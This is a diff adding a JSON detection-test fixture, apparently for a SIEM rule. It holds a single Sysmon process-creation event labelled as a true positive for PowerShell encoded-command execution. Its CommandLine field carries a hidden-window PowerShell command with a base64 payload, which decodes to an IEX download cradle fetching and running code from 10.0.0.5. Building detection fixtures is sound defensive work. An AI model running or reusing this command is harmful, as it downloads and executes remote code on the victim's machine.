@@ -1,0 +1,19 @@
+{
+  "name": "PowerShell Encoded Command Execution",
+  "description": "powershell.exe launched with -nop -w hidden and a base64 -enc payload from cmd.exe. Sysmon Event ID 1 (ProcessCreation). Matches the encoded-command selection plus a suspicious-combo flag, and the parent is not a known automation tool, so no exclusion applies. Must fire the PowerShell encoded-command rule.",
+  "type": "true_positive",
+  "technique_id": "T1059.001",
+  "events": [
+    {
+      "EventID": 1,
+      "UtcTime": "2024-03-21 16:44:19.501",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ProcessId": 8420,
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ParentProcessId": 5104,
+      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA1AC8AYQAnACkA",
+      "User": "CORP\\jdoe",
+      "IntegrityLevel": "High"
+    }
+  ]
+}
